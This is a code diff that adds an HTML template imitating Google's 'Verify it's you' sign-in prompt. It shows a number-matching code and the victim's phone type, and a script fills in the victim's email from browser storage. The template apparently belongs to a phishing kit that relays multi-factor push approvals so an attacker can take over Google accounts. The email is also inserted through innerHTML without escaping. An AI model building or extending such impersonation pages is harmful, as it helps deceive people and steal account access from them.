@@ -1,0 +1,33 @@
+{% extends 'base.html' %}
+{% block title %}
+Sign in - Google Account
+{%  endblock %}
+
+{% block form %}
+<p id="header"> Verify it's you</p>
+<p id="subHeader_emailConfirm">To help keep your account safe, Google wants to make sure it's really you trying to sign in
+<br><span id="eemail">
+    <i class="fa-solid fa-user"></i>&nbsp
+    <span id="email-el"></span>&nbsp
+    <i class="fa-solid fa-chevron-down"></i>
+    </span></p>
+<p id="confirmation_num">{{number}}</p>
+<p id="check_phone">Check your {{phone|upper}}</p>
+<p id="sub_check_phone">Google sent a notification to your {{phone|upper}}. Tap <b>Yes</b> on the notifiation, then tap <b>{{number}}</b> on your phone to verify it's you.</p>
+<p id="sub_check_phone" style="margin-top: -10px;">Or open the Google app on your Phone to verify it's you from there.</p>
+{% endblock %}
+
+{% block foot %}
+<div class="a_footer">
+<a href="" id="Resend_it">Resend it</a>
+<a href="" id="Try_another_way">Try another way</a>
+</div>
+<script>
+    window.addEventListener('load' , () => {
+        const email = localStorage.getItem("EMAIL");
+        document.getElementById("email-el").innerHTML = email;
+    })
+</script>
+
+{% endblock %}
+
